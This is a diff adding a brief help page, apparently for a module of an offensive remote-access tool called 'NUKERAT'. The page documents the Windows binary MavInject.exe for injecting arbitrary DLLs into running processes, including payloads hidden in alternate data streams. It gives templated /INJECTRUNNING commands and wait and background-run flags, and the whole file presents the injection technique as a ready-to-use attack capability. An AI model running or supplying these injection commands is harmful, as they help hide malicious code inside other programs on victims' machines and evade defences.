@@ -1,0 +1,19 @@
+ABOUT
+    Microsoft Application Virtualization injector. LOLBAS loads
+    arbitrary DLLs into running processes, including payloads stored
+    in alternate data streams.
+
+USAGE:
+    MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}
+    Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll
+
+EXAMPLES:
+    MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}
+    Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}
